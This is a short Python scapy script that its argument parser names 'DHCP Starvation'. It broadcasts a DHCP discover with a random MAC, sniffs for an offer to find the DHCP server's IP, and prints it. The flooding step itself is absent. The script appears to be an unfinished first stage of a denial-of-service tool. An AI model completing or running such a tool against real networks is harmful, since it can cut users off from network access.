import argparse,subprocess
from scapy.all import conf, Ether, IP, UDP, BOOTP, DHCP, RandMAC, sendp, sniff,ARP,srp

def get_dhcp_server_ip(iface):
    pkt = (
        Ether(dst="FF:FF:FF:FF:FF:FF") /
        IP(src='0.0.0.0',dst='255.255.255.255') / 
        UDP(sport=68,dport=67) / 
        BOOTP(chaddr=RandMAC()) / 
        DHCP(options=[('message-type','discover'),'end'])
    )

    sendp(pkt, iface=iface, verbose=0)
    pkt = sniff(filter="udp and (port 67 or 68)", count=1, iface=iface, timeout=5)[0]
    if pkt.haslayer(DHCP) and pkt[DHCP].options[0][1] == 2: 
        return pkt[IP].src
    return None

def main():
    argv_parser = argparse.ArgumentParser('DHCP Starvation')
    argv_parser.add_argument(
        '-i', '--iface',
        help='Interface you wish to use',
        required=False
    )
    argv_parser.add_argument(
        '-t', '--target',
        help='IP of target server',
        required=False
    )

    argv = argv_parser.parse_args()
    iface = argv.iface if argv.iface else conf.iface
    if not iface:
        print("Unable to get default interface")
        exit(0)

    print(f"Searching DHCP server's IP address for IFACE {iface} ...")
    tar_ip = argv.target if argv.target else get_dhcp_server_ip(iface)
    if not tar_ip:
        print("Unable to get DHCP server's IP address")
        exit(0) 

    print(f"Checking: IFACE: {iface} | Target IP: {tar_ip}")

main()